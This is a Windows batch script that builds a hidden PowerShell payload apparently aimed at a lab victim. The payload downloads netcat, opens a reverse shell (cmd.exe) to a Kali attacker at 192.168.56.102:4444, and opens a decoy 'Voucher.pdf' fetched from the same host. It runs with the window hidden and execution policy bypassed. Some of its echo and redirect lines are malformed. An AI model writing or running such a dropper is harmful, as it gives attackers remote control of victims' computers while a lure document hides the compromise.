@echo off
:: Define the path for the temporary PowerShell script
set tempPS1=%temp%\reverse_shell.ps1

:: Create the PowerShell script file on the fly

echo $ncUrl = "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip" >> "%tempPS1%"
echo $downloadPath = "$env:TEMP\nc.zip" >> "%tempPS1%"
echo $extractPath = "C:\Tools\nc" >> "%tempPS1%"
echo $ncPath = "$extractPath\nc.exe" >> "%tempPS1%"
echo $kaliIP = "192.168.56.102"   ^# CHANGE THIS >> "%tempPS1%"
echo $port = 4444 >> "%tempPS1%"
echo ^ if (-Not (Test-Path $extractPath)) { ^ >> "%tempPS1%"
echo ^ New-Item -ItemType Directory -Path $extractPath -Force ^|^ Out-Null ^ >> "%tempPS1%"
echo ^}^ >> "%tempPS1%"
echo ^Invoke-WebRequest -Uri $ncUrl -OutFile $downloadPath^ >> "%tempPS1%"
echo ^Add-Type -AssemblyName System.IO.Compression.FileSystem^ >> "%tempPS1%"
echo ^[System.IO.Compression.ZipFile]::ExtractToDirectory($downloadPath, $extractPath)^ >> "%tempPS1%"
echo ^C:\Tools\nc\netcat-1.11\nc.exe  192.168.56.102 4444 -e cmd.exe ^ >> 
echo Invoke-WebRequest -Uri "http://192.168.56.102:8080/Voucher.pdf" -OutFile "$env:TEMP\Voucher.pdf"
echo Start-Process "$env:TEMP\Voucher.pdf"


:: Run the PowerShell script silently
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%tempPS1%"